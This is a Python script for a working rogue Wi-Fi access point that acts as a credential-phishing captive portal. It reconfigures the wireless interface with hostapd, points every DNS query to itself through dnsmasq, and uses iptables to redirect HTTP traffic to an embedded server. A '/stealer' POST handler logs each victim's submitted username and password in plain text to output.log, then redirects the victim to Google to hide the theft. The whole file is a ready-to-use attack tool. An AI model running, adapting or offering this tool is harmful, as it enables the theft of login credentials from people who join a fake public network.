# rogue-ap.py (Python-only version with embedded web server)

import os
import signal
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse


def run(command):
    """Execute a shell command and return stdout and stderr."""
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode(), result.stderr.decode()
    except subprocess.CalledProcessError as e:
        print(f"Command failed: {command}\n{e.stderr.decode()}")
        return "", e.stderr.decode()


def get_interfaces():
    result = subprocess.run(["ip", "link"], capture_output=True, text=True)
    lines = result.stdout.split("\n")
    interfaces = []
    for line in lines:
        if ": " in line:
            name = line.split(": ")[1].split("@")[0]
            if not name.startswith("lo"):
                interfaces.append(name)
    return interfaces


def select_interface():
    interfaces = get_interfaces()
    print("\nAvailable interfaces:")
    for idx, iface in enumerate(interfaces):
        print(f"{idx+1}. {iface}")
    while True:
        choice = input("Select interface to use in AP mode: ")
        if choice.isdigit() and 1 <= int(choice) <= len(interfaces):
            return interfaces[int(choice) - 1]
        print("Invalid choice.")


def select_directory():
    while True:
        path = input("Enter absolute path to HTML root directory: ")
        if os.path.isabs(path) and os.path.isdir(path):
            return path
        print("Invalid path. Must be an existing absolute directory.")


def get_ap_name():
    ap_name = input("Enter AP name [default: Free Wifi]: ").strip()
    return ap_name if ap_name else "Free Wifi"


class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("www/index.html", "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()

    def do_POST(self):
        if self.path == "/stealer":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            fields = urllib.parse.parse_qs(post_data.decode())
            username = fields.get('username', [''])[0]
            password = fields.get('password', [''])[0]

            with open("output.log", "a") as f:
                f.write(f"[+] User: {username} | Pass: {password}\n")

            self.send_response(302)
            self.send_header('Location', 'https://google.com')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()


def start_server(html_root, bind_ip="192.168.1.1", port=80):
    os.chdir(html_root)
    server = HTTPServer((bind_ip, port), CaptivePortalHandler)
    print(f"[+] Web server running at http://{bind_ip}:{port}")
    server.serve_forever()


def setup_ap(iface, ssid):
    print(f"[+] Starting rogue AP '{ssid}' on interface {iface}...")

    # Stop interfering services
    run("systemctl stop NetworkManager")

    # Save iptables rules
    run("iptables-save > /tmp/iptables.bak")

    # Set interface down and up in monitor mode
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type __ap")
    run(f"ip link set {iface} up")

    # Create dnsmasq config
    dnsmasq_conf = f"""
dhcp-range=192.168.1.2,192.168.1.20,255.255.255.0,24h
interface={iface}
address=/#/192.168.1.1
"""
    with open("/tmp/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)

    # Start dnsmasq
    run(f"dnsmasq -C /tmp/dnsmasq.conf")

    # Set static IP
    run(f"ip addr add 192.168.1.1/24 dev {iface}")

    # Enable hostapd
    hostapd_conf = f"""
interface={iface}
driver=nl80211
ssid={ssid}
channel=6
"""
    with open("/tmp/hostapd.conf", "w") as f:
        f.write(hostapd_conf)

    run(f"hostapd /tmp/hostapd.conf &")

    # Redirect all HTTP to our server
    run(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80")
    run(f"iptables -t nat -A POSTROUTING -j MASQUERADE")


def cleanup(iface):
    print("[!] Cleaning up...")
    print("Stopping services...")
    run("pkill hostapd")
    run("pkill dnsmasq")
    print(f"Setting interface {iface} back to managed mode...")
    run(f"ip addr flush dev {iface}")
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type managed")
    run(f"ip link set {iface} up") 
    print("Restoring iptables configuration...")
    run("iptables-restore < /tmp/iptables.bak")
    print("Deleting temp files...")
    run("rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf /tmp/iptables.bak")
    run("systemctl start NetworkManager")
    print("System fully restored.")


if __name__ == "__main__":
    iface = select_interface()
    html_root = select_directory()
    ap_name = get_ap_name()

    setup_ap(iface, ap_name)

    try:
        threading.Thread(target=start_server, args=(html_root,), daemon=True).start()
        print("[!] Press 'q' then Enter to stop the rogue AP...")
        while input().strip().lower() != 'q':
            pass
    except KeyboardInterrupt:
        print("[!] Interrupted with Ctrl+C")

    cleanup(iface)
    print("[!] Rogue AP stopped.")